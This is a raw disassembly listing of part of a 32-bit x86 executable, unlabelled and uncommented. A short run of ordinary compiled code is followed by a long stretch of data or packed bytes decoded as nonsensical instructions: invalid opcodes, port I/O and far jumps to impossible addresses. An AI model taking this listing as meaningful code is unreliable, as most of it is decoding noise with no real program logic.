  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0x210529ff,eax
  408b09:	pop    ss
  408b0a:	cmp    dl,ch
  408b0c:	in     eax,0x7b
  408b0e:	jnp    0x408b23
  408b10:	pushf  
  408b11:	jnp    0x408b8e
  408b13:	jmp    FWORD PTR [ebp+0x49648ff8]
  408b19:	push   eax
  408b1a:	gs loop 0x408b6e
  408b1d:	scas   al,BYTE PTR es:[edi]
  408b1e:	jns    0x408b3e
  408b20:	pop    ebx
  408b21:	mov    al,ds:0xeb13fe23
  408b26:	jns    0x408ad1
  408b28:	and    eax,ebx
  408b2a:	push   0x5f
  408b2c:	dec    ebx
  408b2d:	pusha  
  408b2e:	mov    DWORD PTR [eax-0x50aedcc8],esp
  408b34:	push   cs
  408b35:	pop    esi
  408b36:	jns    0x408ba4
  408b38:	stos   BYTE PTR es:[edi],al
  408b39:	dec    ebx
  408b3a:	popa   
  408b3b:	fidivr DWORD PTR [ecx-0x1b]
  408b3e:	push   esp
  408b3f:	loope  0x408b39
  408b41:	push   ss
  408b42:	pop    eax
  408b43:	pop    eax
  408b44:	ret    0xae5a
  408b47:	jns    0x408b7f
  408b49:	mov    eax,ds:0x4d1aeef3
  408b4e:	sbb    DWORD PTR cs:[eax+0x198c1bf9],edi
  408b55:	xchg   BYTE PTR [ebp+0x70bc035a],dl
  408b5b:	mov    ebp,0xf1435a7d
  408b60:	cmp    eax,edi
  408b62:	xchg   ebx,eax
  408b63:	shl    DWORD PTR [esi-0x75eb7521],cl
  408b69:	and    DWORD PTR [ecx],0x66
  408b6c:	out    dx,eax
  408b6d:	cli    
  408b6e:	push   ecx
  408b6f:	pop    edx
  408b70:	add    al,BYTE PTR ds:0x55677e8b
  408b76:	cs cmc 
  408b78:	sbb    BYTE PTR [ecx-0x2a9e9039],dh
  408b7e:	loop   0x408b9b
  408b80:	inc    esi
  408b81:	xchg   esi,eax
  408b82:	dec    edx
  408b83:	jo     0x408b68
  408b85:	repnz mov ah,0x89
  408b88:	and    ebx,DWORD PTR [eax+edx*8+0x78]
  408b8c:	push   eax
  408b8d:	(bad)  [esi-0x7c4fcff4]
  408b93:	int    0x74
  408b95:	cmp    eax,DWORD PTR [esi-0x2e18915f]
  408b9b:	out    dx,al
  408b9c:	pop    esp
  408b9d:	mov    ah,0xfd
  408b9f:	mov    ds:0xd375977f,al
  408ba4:	and    BYTE PTR [ecx+ecx*2-0x3bb73e5a],dh
  408bab:	and    al,0x56
  408bad:	test   BYTE PTR [eax-0x1c485265],bl
  408bb3:	add    BYTE PTR [edi],ah
  408bb5:	mov    ebp,0x6837969
  408bba:	hlt    
  408bbb:	or     BYTE PTR [ecx],dl
  408bbd:	mov    ah,0x84
  408bbf:	mov    al,0x98
  408bc1:	mov    eax,0x54b51cee
  408bc6:	mov    bl,0xa3
  408bc8:	cmp    BYTE PTR [ebp-0x4b],al
  408bcb:	jg     0x408b56
  408bcd:	(bad)
  408bd0:	xchg   esi,eax
  408bd1:	sbb    dl,bh
  408bd3:	inc    ebp
  408bd4:	mov    al,0x67
  408bd6:	pop    ebx
  408bd7:	xchg   esp,eax
  408bd8:	mov    WORD PTR [edi-0x71],fs
  408bdb:	cmp    ebx,esi
  408bdd:	out    dx,eax
  408bde:	movnti DWORD PTR [ebx-0x4e],ebp
  408be2:	out    dx,eax
  408be3:	jno    0x408bdd
  408be5:	imul   ebp,DWORD PTR [edx-0x66],0xffffffc9
  408be9:	add    DWORD PTR [ebp-0x69],edi
  408bec:	int    0x10
  408bee:	fstp   TBYTE PTR [edi+0x6f21aa35]
  408bf4:	sbb    edi,ebp
  408bf6:	outs   dx,DWORD PTR ds:[esi]
  408bf7:	or     DWORD PTR [eax+eax*1-0x18],edi
  408bfb:	push   ss
  408bfc:	adc    cl,BYTE PTR [ebx+edi*4-0x76b818aa]
  408c03:	pop    edx
  408c04:	jl     0x408c85
  408c06:	das    
  408c07:	dec    edx
  408c08:	mov    BYTE PTR [edi+0x68],ch
  408c0b:	in     al,0x2c
  408c0d:	hlt    
  408c0e:	push   0xffffffa4
  408c10:	scas   eax,DWORD PTR es:[edi]
  408c11:	jnp    0x408c4e
  408c13:	ds xchg edi,eax
  408c15:	js     0x408c81
  408c17:	loop   0x408b9e
  408c19:	pop    edi
  408c1a:	mov    DWORD PTR [ebx],edi
  408c1c:	cmc    
  408c1d:	in     al,0x24
  408c1f:	mov    bh,0x1d
  408c21:	scas   al,BYTE PTR es:[edi]
  408c22:	es jno 0x408c41
  408c25:	or     al,0x74
  408c27:	sbb    al,0x90
  408c29:	and    DWORD PTR ds:0x4faa397f,edx
  408c2f:	ins    DWORD PTR es:[edi],dx
  408c30:	loopne 0x408bfa
  408c32:	leave  
  408c33:	dec    esi
  408c34:	pop    edi
  408c35:	fnstenv ds:0xa2c9884
  408c3b:	xor    DWORD PTR [ebx-0x54ae4376],ecx
  408c41:	mov    ds:0x51e2f90d,eax
  408c46:	jns    0x408c6c
  408c48:	pop    DWORD PTR [eax+0x319d9542]
  408c4e:	xchg   esi,eax
  408c4f:	or     ecx,eax
  408c51:	push   ebp
  408c52:	and    eax,0xc1e8119a
  408c57:	inc    edi
  408c58:	stos   DWORD PTR es:[edi],eax
  408c59:	sbb    BYTE PTR [ebx],dl
  408c5b:	jg     0x408c6a
  408c5d:	stos   DWORD PTR es:[edi],eax
  408c5e:	outs   dx,DWORD PTR ds:[esi]
  408c5f:	mov    dh,0xab
  408c61:	push   0xffffffb9
  408c63:	sub    esi,ebp
  408c65:	mov    dl,ch
  408c67:	mul    BYTE PTR [eax-0xa]
  408c6a:	adc    eax,0x359f0d95
  408c6f:	adc    bl,BYTE PTR [ebp+0x62]
  408c72:	mov    bl,0xf2
  408c74:	ss fwait
  408c76:	adc    al,0x81
  408c78:	mov    bl,0x34
  408c7a:	fcmovne st,st(4)
  408c7c:	inc    ebx
  408c7d:	fsub   QWORD PTR [esp+edx*8-0x27]
  408c81:	push   esi
  408c82:	mov    bl,ch
  408c84:	out    dx,al
  408c85:	popa   
  408c86:	push   esi
  408c87:	data16 aam 0xb9
  408c8a:	lahf   
  408c8b:	xor    al,0x78
  408c8d:	mov    bh,0x20
  408c8f:	and    al,0xe6
  408c91:	pop    ecx
  408c92:	sahf   
  408c93:	pop    ss
  408c94:	fcomp  QWORD PTR [ebx-0x4a]
  408c97:	stos   DWORD PTR es:[edi],eax
  408c98:	push   ss
  408c99:	(bad)  
  408c9a:	jmp    0x8fc26221
  408c9f:	fs pop edi
  408ca1:	outs   dx,DWORD PTR ds:[esi]
  408ca2:	mov    dh,0x47
  408ca4:	jg     0x408c51
  408ca6:	sbb    bl,BYTE PTR [eax]
  408ca8:	pop    ebx
  408ca9:	jl     0x408c47
  408cab:	pop    es
  408cac:	shl    BYTE PTR [ecx+0x1],0xd3
  408cb0:	(bad)  
  408cb1:	cld    
  408cb2:	gs ds pop edi
  408cb5:	cmp    DWORD PTR [ecx-0x1b],ebx
  408cb8:	scas   eax,DWORD PTR es:[edi]
  408cb9:	xchg   ebp,eax
  408cba:	sbb    DWORD PTR [edi+0x5d6eea28],0x753093bc
  408cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cc5:	faddp  st(6),st
  408cc7:	(bad)  
  408cc8:	out    0x42,eax
  408cca:	test   eax,0x80993394
  408ccf:	ds mov ah,0x11
  408cd2:	ins    BYTE PTR es:[edi],dx
  408cd3:	ins    DWORD PTR es:[edi],dx
  408cd4:	xchg   esp,eax
  408cd5:	dec    edx
  408cd6:	adc    al,0x88
  408cd8:	out    0x1b,eax
  408cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cdb:	or     DWORD PTR [edx+0x6c2db633],ecx
  408ce1:	or     eax,0xb76590b9
  408ce6:	sbb    DWORD PTR ds:0x76926942,ebx
  408cec:	pop    ecx
  408ced:	jno    0x408cff
  408cef:	cmp    ch,BYTE PTR [edx]
  408cf1:	lahf   
  408cf2:	push   esp
  408cf3:	jecxz  0x408d3a
  408cf5:	push   ebx
  408cf6:	mov    ebx,0xbc71dad9
  408cfb:	push   cs
  408cfc:	sbb    DWORD PTR [edx],edi
  408cfe:	fwait
  408cff:	mov    WORD PTR [edi],ds
  408d01:	xor    DWORD PTR [edx],edi
  408d03:	lock test BYTE PTR ss:[ebp+esi*8+0x19],0x18
  408d0a:	jge    0x408c93
  408d0c:	lods   al,BYTE PTR ds:[esi]
  408d0d:	icebp  
  408d0e:	xor    eax,DWORD PTR [edi+ebp*1-0x59]
  408d12:	mov    ebx,0x9b3e62f0
  408d17:	push   esp
  408d18:	mov    edx,0xdf775f72
  408d1d:	cdq    
  408d1e:	test   BYTE PTR [edi-0x1b],ah
  408d21:	jae    0x408cf8
  408d23:	xchg   esp,eax
  408d24:	data16 mov WORD PTR [eax],?
  408d27:	cmp    dl,dh
  408d29:	dec    esp
  408d2a:	cmp    eax,0xaa58decc
  408d2f:	les    edi,FWORD PTR [ecx]
  408d31:	inc    DWORD PTR [ecx-0x13afbb86]
  408d37:	adc    ebp,edi
  408d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d3a:	pushf  
  408d3b:	sub    cl,BYTE PTR [edx+0xf]
  408d3e:	lods   al,BYTE PTR ds:[esi]
  408d3f:	cs adc esi,eax
  408d42:	(bad)  
  408d43:	push   esp
  408d44:	les    ecx,FWORD PTR ds:0xa6b6b5e6
  408d4a:	sahf   
  408d4b:	int3   
  408d4c:	adc    al,BYTE PTR [esi]
  408d4e:	sbb    edi,ebx
  408d50:	jg     0x408d5a
  408d52:	icebp  
  408d53:	call   0x61dc4248
  408d58:	call   0x1f81:0x23ff3623
  408d5f:	cmp    al,0x83
  408d61:	pushf  
  408d62:	sub    al,0x7
  408d64:	xor    DWORD PTR [eax-0x54],0xfffffffd
  408d68:	call   esi
  408d6a:	rcl    edx,cl
  408d6c:	aaa    
  408d6d:	cpuid  
  408d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d70:	imul   ebx,DWORD PTR ds:0x4a6db455,0x38fbbfde
  408d7a:	or     ebx,0x49
  408d7d:	sub    BYTE PTR [eax-0x46],ch
  408d80:	mov    ds:0x85b66a57,al
  408d85:	mov    bl,0xc1
  408d87:	push   esp
  408d88:	ins    BYTE PTR es:[edi],dx
  408d89:	clc    
  408d8a:	mov    BYTE PTR [ecx-0x19a9c02],dl
  408d90:	clc    
  408d91:	jle    0x408dd3
  408d93:	outs   dx,BYTE PTR ds:[esi]
  408d94:	xchg   DWORD PTR [edi],esp
  408d96:	add    BYTE PTR [esi+0x146a260e],ah
  408d9c:	cmp    ebp,DWORD PTR [edi-0x1f9c6a3]
  408da2:	dec    ebx
  408da3:	add    esp,DWORD PTR [edx+0xd1a5ae8]
  408da9:	xchg   DWORD PTR [ecx+0x58d1df8e],eax
  408daf:	adc    al,0x84
  408db1:	neg    BYTE PTR [edi]
  408db3:	stos   DWORD PTR es:[edi],eax
  408db4:	loope  0x408d86
  408db6:	pop    esi
  408db7:	mov    bl,0xe0
  408db9:	call   0xa396:0x19792055
  408dc0:	add    BYTE PTR [eax],al
  408dc2:	push   esi
  408dc3:	test   DWORD PTR [esi+0x7c4b7e3a],ebx
  408dc9:	cli    
  408dca:	adc    al,0x95
  408dcc:	xchg   edx,eax
  408dcd:	jecxz  0x408db6
  408dcf:	in     al,dx
  408dd0:	in     al,dx
  408dd1:	int3   
  408dd2:	loopne 0x408d73
  408dd4:	jg     0x408deb
  408dd6:	push   ecx
  408dd7:	cmp    DWORD PTR [esi-0x2264e6e7],edi
  408ddd:	aam    0x30
  408ddf:	or     DWORD PTR [ecx],edx
  408de1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408de2:	push   cs
  408de3:	lock ds mov edx,ebx
  408de7:	xchg   ebp,esi
  408de9:	dec    ecx
  408dea:	pop    edi
  408deb:	push   edx
  408dec:	adc    al,0x66
  408dee:	sub    DWORD PTR [ebx-0x66],ebp
  408df1:	or     DWORD PTR [ecx],esp
  408df3:	and    eax,0x93250d6
  408df8:	aaa    
  408df9:	into   
  408dfa:	cmp    eax,0x8c808204
  408dff:	dec    esi
  408e00:	(bad)  [eax-0x7]
  408e03:	sub    cl,ch
  408e05:	outs   dx,DWORD PTR ds:[esi]
  408e06:	or     eax,0x64389f9c
  408e0b:	cmp    bl,0xf2
  408e0e:	addr16 aas 
  408e10:	ja     0x408da6
  408e12:	icebp  
  408e13:	(bad)  
  408e14:	adc    eax,0xa53e5b57
  408e19:	add    DWORD PTR [esi-0x5a9c0334],ebp
  408e1f:	idiv   DWORD PTR es:[edx-0x22849bd3]
  408e26:	in     eax,dx
  408e27:	cmp    ecx,DWORD PTR [edi]
  408e29:	imul   esi,DWORD PTR [eax+edx*8+0x4d],0x49834abb
  408e31:	aam    0xef
  408e33:	mov    ss,WORD PTR [eax-0x6ef303c9]
  408e39:	jno    0x408eac
  408e3b:	sar    ebp,1
  408e3d:	mov    ecx,0xb705adb3
  408e42:	push   es
  408e43:	mov    cl,0x31
  408e45:	mov    edi,0xff012e3b
  408e4a:	rcl    DWORD PTR [edi-0x4d],cl
  408e4d:	xlat   BYTE PTR ds:[ebx]
  408e4e:	imul   edi,DWORD PTR [edi-0x54],0x97e6bb48
  408e55:	sbb    BYTE PTR [esp+edi*8],al
  408e58:	mov    WORD PTR [edi-0x4e],?
  408e5b:	sub    al,0xed
  408e5d:	ss xchg edi,eax
  408e5f:	mov    esp,0xb03e892e
  408e64:	sub    al,0x9d
  408e66:	pop    edi
  408e67:	dec    ecx
  408e68:	or     ebp,DWORD PTR [esi-0x69]
  408e6b:	imul   esp,DWORD PTR [ebp+esi*1+0x61],0x5ed0eb78
  408e73:	mov    WORD PTR [edi+0x50],ss
  408e76:	mov    dl,0x2d
  408e78:	xor    DWORD PTR [edx],edi
  408e7a:	mov    dh,0xf
  408e7c:	scas   eax,DWORD PTR es:[edi]
  408e7d:	and    al,0x7f
  408e7f:	data16 and BYTE PTR [edi+0x66],bl
  408e83:	push   esp
  408e84:	(bad)  
  408e85:	retf   
  408e86:	out    dx,al
  408e87:	in     al,0x1
  408e89:	pop    esi
  408e8a:	mov    al,ds:0x354e25cc
  408e8f:	jge    0x408e5a
  408e91:	mov    dl,BYTE PTR [esi-0x49]
  408e94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e95:	stos   BYTE PTR es:[edi],al
  408e96:	enter  0x61a8,0xd8
  408e9a:	into   
  408e9b:	mov    ds:0x75aafae8,al
  408ea0:	cmp    BYTE PTR [ebx+0x425e242b],ch
  408ea6:	fidiv  DWORD PTR [edx+0x651a43ce]
  408eac:	xor    eax,0xcb6e4e80
  408eb1:	mov    edx,0xd07f26b4
  408eb6:	pop    edi
  408eb7:	inc    eax
  408eb8:	call   0xbb6:0xb652d1e2
  408ebf:	jl     0x408f01
  408ec1:	push   edx
  408ec2:	mov    edx,DWORD PTR [ebx-0x49486994]
  408ec8:	sbb    edx,ebx
  408eca:	or     cl,ah
  408ecc:	rcl    BYTE PTR [edi],1
  408ece:	pop    ss
  408ecf:	inc    esi
  408ed0:	or     eax,DWORD PTR [ecx-0x2163c6d5]
  408ed6:	sahf   
  408ed7:	pop    es
  408ed8:	adc    ah,BYTE PTR [ecx]
  408eda:	adc    ch,ch
  408edc:	xchg   edi,eax
  408edd:	icebp  
  408ede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408edf:	ins    BYTE PTR es:[edi],dx
  408ee0:	or     ecx,DWORD PTR [edx-0x669b3ab7]
  408ee6:	and    edx,DWORD PTR [ebx-0x2c1d4113]
  408eec:	xor    BYTE PTR [ebx+0x3e],ch
  408eef:	(bad)  
  408ef0:	jns    0x408ed3
  408ef2:	inc    edi
  408ef3:	call   0x86c1:0xfe5d0bb7
  408efa:	xlat   BYTE PTR ds:[ebx]
  408efb:	stos   DWORD PTR es:[edi],eax
  408efc:	push   ds
  408efd:	pop    es
  408efe:	popf   
  408eff:	jmp    0x1a26cc09
  408f04:	mov    dl,0x55
  408f06:	ds push ebx
  408f08:	jmp    0x408ec8
  408f0a:	stos   BYTE PTR es:[edi],al
  408f0b:	push   ecx
  408f0c:	push   ecx
  408f0d:	sbb    eax,0x8f00e87e
  408f12:	gs mov cl,0x5a
  408f15:	dec    ebx
  408f16:	push   cs
  408f17:	pop    esp
  408f18:	test   BYTE PTR [edi+edi*4+0x7163d7b1],al
  408f1f:	add    DWORD PTR [ebx+ebx*4-0x173b1540],esp
  408f26:	cmp    eax,0xed0a35bd
  408f2b:	repnz or DWORD PTR [ecx],0x76
  408f2f:	scas   al,BYTE PTR es:[edi]
  408f30:	jno    0x408ed7
  408f32:	pop    edi
  408f33:	dec    esp
  408f34:	shl    ch,1
  408f36:	xchg   esi,eax
  408f37:	jmp    DWORD PTR [ebx+0x65]
  408f3a:	test   ah,ch
  408f3c:	test   eax,0x89bb42d2
  408f41:	fild   QWORD PTR [ebp+0x39]
  408f44:	icebp  
  408f45:	adc    al,0x6f
  408f47:	jmp    0x7381:0x127ac25c
  408f4e:	pop    es
  408f4f:	push   ss
  408f50:	call   0x887ebba1
  408f55:	sar    al,1
  408f57:	in     eax,0x39
  408f59:	inc    edi
  408f5a:	lods   al,BYTE PTR ds:[esi]
  408f5b:	jnp    0x408f5a
  408f5d:	add    ch,cl
  408f5f:	xchg   edi,eax
  408f60:	int    0xde
  408f62:	int3   
  408f63:	sub    edx,edi
  408f65:	clc    
  408f66:	mov    dl,0xc
  408f68:	pop    ss
  408f69:	mov    edx,fs
  408f6b:	call   DWORD PTR [ebx-0x1b]
  408f6e:	mov    ebp,0x8a4ff9d7
  408f73:	pop    ecx
  408f74:	pop    ds
  408f75:	and    al,0xee
  408f77:	ss mov esi,0xf6c3ed60
  408f7d:	cli    
  408f7e:	pop    ebp
  408f7f:	inc    eax
  408f80:	mov    ds:0xd35f4515,eax
  408f85:	gs out 0xe0,eax
  408f88:	imul   edx,DWORD PTR [ebx],0x934d0e72
  408f8e:	jne    0x408f70
  408f90:	aad    0x9d
  408f92:	dec    ecx
  408f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f94:	cs js  0x408f73
  408f97:	dec    ecx
  408f98:	mov    al,0x1f
  408f9a:	call   FWORD PTR [ebp+0x2a]
  408f9d:	test   BYTE PTR [edi+0x63d3db30],bl
  408fa3:	lods   eax,DWORD PTR ds:[esi]
  408fa4:	mov    al,ds:0xc8d62b6d
  408fa9:	nop
  408faa:	pop    eax
  408fab:	mov    cl,0xb9
  408fad:	daa    
  408fae:	call   0xb4e:0x95e83118
  408fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fb6:	lea    esi,[ebp+0x44]
  408fb9:	lock cmp eax,0x13fd9f79
  408fbf:	loopne 0x408fa6
  408fc1:	mov    WORD PTR [edx+0x63],gs
  408fc4:	jle    0x408fe2
  408fc6:	cwde   
  408fc7:	cmp    bh,BYTE PTR ds:0x6ac86e59
  408fcd:	mov    ds:0x65b14c49,eax
  408fd2:	xor    ecx,esp
  408fd4:	adc    al,0x1e
  408fd6:	adc    al,0xe9
  408fd8:	inc    ebx
  408fd9:	mov    edx,DWORD PTR [edi+0xf0ceb02]
  408fdf:	mov    dh,BYTE PTR [esi+esi*8+0x7bfd955d]
  408fe6:	shr    ch,0x8d
  408fe9:	fbstp  TBYTE PTR [ebp-0x3b9e3076]
  408fef:	je     0x40904e
  408ff1:	pop    ss
  408ff2:	scas   eax,DWORD PTR es:[edi]
  408ff3:	cmp    edi,DWORD PTR [ecx]
  408ff5:	fwait
  408ff6:	call   0xfbe1aeaa
  408ffb:	scas   eax,DWORD PTR es:[edi]
  408ffc:	out    dx,al
  408ffd:	stc    
  408ffe:	fiadd  WORD PTR [edi+0x4c]
  409001:	mov    gs,WORD PTR [edi]
  409003:	test   al,0x90
  409005:	mov    ds,WORD PTR [ecx-0x24ad9d4]
  40900b:	push   DWORD PTR gs:[ecx+eax*4+0x662afca1]
  409013:	sbb    eax,edi
  409015:	jle    0x409039
  409017:	or     eax,DWORD PTR [esi]
  409019:	aaa    
  40901a:	and    esi,ebx
  40901c:	mov    dl,0x7f
  40901e:	lea    esi,[ecx-0x51]
  409021:	loopne 0x40907f
  409023:	in     eax,0xc5
  409025:	popf   
  409026:	mov    esp,ebx
  409028:	test   DWORD PTR [ecx+0xcdf5b0f],0x20cf27c6
  409032:	mov    BYTE PTR [ecx-0x22],al
  409035:	add    bh,al
  409037:	mov    ds:0x26a795d2,al
  40903c:	mov    edx,gs
  40903e:	xor    BYTE PTR [ecx-0x1c3915ce],bh
  409044:	(bad)  
  409045:	pop    ebp
  409046:	pop    ecx
  409047:	mov    eax,DWORD PTR [ebx+0xbc5ab79]
  40904d:	mov    ebp,0x78c40fcf
  409052:	fimul  WORD PTR [ebp-0x3122148b]
  409058:	and    ch,BYTE PTR [esi]
  40905a:	in     al,dx
  40905b:	inc    edx
  40905c:	frstor [ecx-0x2c592adf]
  409062:	mov    ss,WORD PTR [edi]
  409064:	fmul   QWORD PTR [eax]
  409066:	lods   eax,DWORD PTR ds:[esi]
  409067:	aad    0xe4
  409069:	inc    ebp
  40906a:	pop    ebp
  40906b:	shl    cl,1
  40906d:	fcomp  QWORD PTR [esi]
  40906f:	je     0x40900c
  409071:	sub    al,0xcb
  409073:	jg     0x40908e
  409075:	add    ecx,ebx
  409077:	mov    fs,WORD PTR [ecx]
  409079:	or     bh,BYTE PTR ds:0xaa65f4d2
  40907f:	mov    WORD PTR [ecx-0x2e4811cb],cs
  409085:	add    DWORD PTR [edx],esp
  409087:	(bad)  
  409089:	outs   dx,BYTE PTR ds:[esi]
  40908a:	repz sbb al,0x13
  40908d:	hlt    
  40908e:	rcl    dl,cl
  409090:	mov    ebp,0xfb866474
  409095:	mov    ebx,0x33256e58
  40909a:	or     al,0x4e
  40909c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40909d:	popf   
  40909e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40909f:	hlt    
  4090a0:	leave  
  4090a1:	mov    ebp,0x2fecc27
  4090a6:	lea    ecx,[ebp-0x65]
  4090a9:	outs   dx,BYTE PTR ds:[esi]
  4090aa:	sbb    al,0x12
  4090ac:	sar    esi,cl
  4090ae:	push   edi
  4090af:	ret    
  4090b0:	ret    
  4090b1:	mov    ah,0x5b
  4090b3:	xchg   ebx,eax
  4090b4:	(bad)  
  4090b6:	mov    WORD PTR [ecx],ss
  4090b8:	pop    ebp
  4090b9:	inc    edx
  4090ba:	(bad)  
  4090bb:	retf   
  4090bc:	int3   
  4090bd:	mov    esp,0x81973161
  4090c2:	test   BYTE PTR [ecx+0xdbeb9c],0x4e
  4090c9:	push   ebx
  4090ca:	(bad)  
  4090cb:	add    ah,BYTE PTR [edi]
  4090cd:	cli    
  4090ce:	jmp    0xfce5:0xb90d283f
  4090d5:	fld    TBYTE PTR [edx-0x217df0ce]
  4090db:	sahf   
  4090dc:	add    bh,0x85
  4090df:	(bad)  
  4090e0:	jnp    0x409151
  4090e2:	jp     0x4090b0
  4090e4:	and    edi,ebx
  4090e6:	adc    eax,0x4cad2a53
  4090eb:	xchg   edi,eax
  4090ec:	fisubr WORD PTR [ebp-0x7f]
  4090ef:	or     DWORD PTR [esi-0x7c],ebx
  4090f2:	fwait
  4090f3:	je     0x40913d
  4090f5:	sub    al,0x85
  4090f7:	jp     0x4090f8
  4090f9:	psllw  mm7,QWORD PTR [ebx+0x9]
  4090fd:	or     esi,ecx
  4090ff:	retf   
  409100:	in     al,0x5f
  409102:	int3   
  409103:	ret    0x4897
  409106:	leave  
  409107:	add    al,0xdd
  409109:	pop    edi
  40910a:	in     eax,dx
  40910b:	mov    cs,WORD PTR [ebx+0x29]
  40910e:	dec    esi
  40910f:	addr16 xchg edi,eax
  409111:	push   esp
  409112:	call   0x4549:0xc4a00a63
  409119:	inc    edx
  40911a:	imul   ebx,DWORD PTR [ebp+0x5eea0055],0x23250d12
  409124:	pop    eax
  409125:	and    bl,al
  409127:	and    al,0xbe
  409129:	mov    ebp,0xb38b009e
  40912e:	mov    ebx,0x54d452d6
  409133:	scas   eax,DWORD PTR es:[edi]
  409134:	out    dx,al
  409135:	mov    ah,BYTE PTR [edx]
  409137:	dec    eax
  409138:	inc    ebp
  409139:	inc    esp
  40913a:	retf   0xeeed
  40913d:	js     0x409149
  40913f:	mov    esi,0x9f82a3b4
  409144:	(bad)  
  409145:	fxch   st(2)
  409147:	les    edi,FWORD PTR [ebx]
  409149:	mov    ecx,0xfc5382f6
  40914e:	sbb    edx,DWORD PTR [edx+0x67ba0db8]
  409154:	mov    ch,0x1e
  409156:	rol    DWORD PTR [ebp-0x29],1
  409159:	ins    DWORD PTR es:[edi],dx
  40915a:	jne    0x4090fa
  40915c:	pop    esp
  40915d:	mov    edx,0xc15c835f
  409162:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409164:	or     ah,ch
  409166:	iret   
  409167:	mov    edx,esi
  409169:	pushf  
  40916a:	lds    ebp,FWORD PTR [edi+0x22936865]
  409170:	icebp  
  409171:	test   eax,edi
  409173:	pop    es
  409174:	loop   0x409141
  409176:	sbb    ah,BYTE PTR [ecx]
  409178:	jmp    0x4091d4
  40917a:	fisub  WORD PTR [edx+0x4c01aa3e]
  409180:	dec    edi
  409181:	dec    eax
  409182:	repz imul edi,ebx,0xfc7d9b3
  409189:	daa    
  40918a:	js     0x409186
  40918c:	jmp    0x40915c
  40918e:	ja     0x4091fd
  409190:	(bad)  ds:0x8c1ee8ba
  409196:	stc    
  409197:	pop    edx
  409198:	jae    0x4091a3
  40919a:	xchg   ecx,eax
  40919b:	sbb    al,0x4d
  40919d:	jb     0x409192
  40919f:	sub    dl,BYTE PTR [eax-0x36f0e71f]
  4091a5:	and    eax,0xaaadb758
  4091aa:	test   al,0xac
  4091ac:	in     al,0x89
  4091ae:	add    ch,ch
  4091b0:	stos   BYTE PTR es:[edi],al
  4091b1:	xlat   BYTE PTR ds:[ebx]
  4091b2:	retf   0x4e1c
  4091b5:	sbb    eax,DWORD PTR [edx]
  4091b7:	test   DWORD PTR [edx],edi
  4091b9:	and    BYTE PTR [eax+0x1218b938],dl
  4091bf:	dec    ebp
  4091c0:	inc    ebx
  4091c1:	aam    0xc0
  4091c3:	adc    eax,0x9045a2f6
  4091c8:	and    al,0x1d
  4091ca:	lahf   
  4091cb:	ret    0xaf5e
  4091ce:	dec    ebp
  4091cf:	jnp    0x409219
  4091d1:	out    dx,al
  4091d2:	pop    es
  4091d3:	xchg   esi,eax
  4091d4:	sub    esp,DWORD PTR [edx+0x3]
  4091d7:	dec    edi
  4091d8:	and    al,0xbd
  4091da:	das    
  4091db:	xchg   edi,eax
  4091dc:	inc    ecx
  4091dd:	cs into 
  4091df:	inc    ebx
  4091e0:	call   0xf8d2:0x29047b
  4091e7:	ins    BYTE PTR es:[edi],dx
  4091e8:	xchg   esi,eax
  4091e9:	sub    bh,bh
  4091eb:	out    0x1b,al
  4091ed:	pop    ecx
  4091ee:	outs   dx,BYTE PTR ds:[esi]
  4091ef:	xor    eax,0xdfd39578
  4091f4:	lea    ebp,[ebx]
  4091f6:	xor    DWORD PTR [edi],ebp
  4091f8:	jo     0x409232
  4091fa:	jae    0x4091e5
  4091fc:	jl     0x409229
  4091fe:	iret   
  4091ff:	enter  0x65d6,0x84
  409203:	cld    
  409204:	jge    0x40927a
  409206:	add    al,0xc8
  409208:	(bad)  
  409209:	out    0x4f,eax
  40920b:	lods   al,BYTE PTR ds:[esi]
  40920c:	push   edx
  40920d:	adc    eax,0x81a342b2
  409212:	sbb    eax,0x8369ca71
  409217:	lods   eax,DWORD PTR ds:[esi]
  409218:	lea    edi,[ecx]
  40921a:	jge    0x4091f0
  40921c:	push   esp
  40921d:	mov    edx,0xe7a71376
  409222:	repz test BYTE PTR fs:[ecx+0x78],bh
  409227:	jl     0x4091f5
  409229:	or     eax,0xe88290c4
  40922e:	sbb    al,0x99
  409230:	add    al,BYTE PTR [esi+ebp*2]
  409233:	test   al,0xa3
  409235:	(bad)  
  409236:	cmc    
  409237:	rol    esi,0x10
  40923a:	loope  0x409299
  40923c:	adc    ebp,esp
  40923e:	pop    ss
  40923f:	loop   0x40922d
  409241:	inc    edx
  409242:	mov    edi,0xc744b8a
